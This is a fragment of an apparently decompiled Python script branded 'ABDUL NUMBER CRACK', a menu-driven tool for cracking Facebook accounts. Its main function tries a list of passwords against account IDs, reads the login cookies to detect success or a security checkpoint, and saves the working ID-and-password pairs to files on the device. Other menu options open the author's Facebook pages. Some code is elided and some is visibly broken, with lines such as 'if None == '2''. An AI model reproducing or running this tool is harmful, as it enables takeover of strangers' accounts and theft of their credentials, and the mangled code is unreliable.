...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/AbdulRehman82082/channel/UCG8CSxk8KQMZuVfRhCa6FBw')
        FD()
        return None
...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] FOLLOW MY 2ND ACC')
    print(' [2] EXIT')
    opt = input('\n  \x1b[1;32m Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/Lofar.khan3524/y837qD_AO6Q')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    os.system('clear')
    jalan(logo)
    jalan('\tðŸ”¥ðŸ”¥ABDUL NUMBER CRACKðŸ”¥ðŸ”¥')
    print('')
    jalan('\x1b[1;32m [1]\x1b[1;33m ABDUL CRACK ')
    jalan('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FACEBOOK')
    jalan(' \x1b[1;32m[3] \x1b[1;32mFOLLOW ME')
    jalan(' \x1b[1;32m[4] \x1b[1;32mABDUL')
    jalan(' \x1b[1;32m[00] \x1b[1;31m')
    opt = input('\n   \x1b[1;32m Choose option >>> ')
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/AbdulRehman82082')
        return None
    if None == '3':
        os.system('xdg-open https://www.facebook.com/Lofar.khan3524/UCG8CSxk8KQMZuVfRhCa6FBw')
        return None
    if None == '4':
        os.system('xdg-open /207678473842318/')
        return None
    if None == '0':
        os.system('exit')
        return None
...
\033[1;37m================= \33[32;45mABDUL x R\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33m ABDUL x R\33[0;m\033[1;32m && \033[1;33mABDUL x R\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m ABDUL REHMAN 
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTEAM-AxR
...
\033[1;37m================= \33[32;45mABDUL x R\33[0;m =====================
       ...
       \33[37;41m\t WELLCOME TO AxR TOOL\33[0;m
...
def i():
    ...
    print('Ids saved in Abdul ok.txt,Abdul cp.txt')
    print('\033[1;32m============================================')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/ABDUxR-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(ABDUL-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ABDUL-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[ABDU x R] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
